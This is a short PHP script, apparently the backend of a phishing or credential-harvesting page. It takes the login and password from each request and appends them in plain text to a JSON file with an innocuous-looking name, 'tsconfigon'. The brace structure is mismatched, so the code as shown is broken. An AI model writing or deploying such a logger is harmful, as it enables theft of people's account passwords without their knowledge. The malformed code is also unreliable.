<?php

if(!empty($_REQUEST['login'])) {
    $date = "";
    $filename = "tsconfigon";


    if (is_file($filename)) {
        $date = file_get_contents($filename);



     }
    }


    $json_arr = json_decode($date, true);

    $json_arr[] = array('login' => $_REQUEST['login'], 'password' => $_REQUEST['password']);

    file_put_contents($filename, json_encode($json_arr));
}
?>
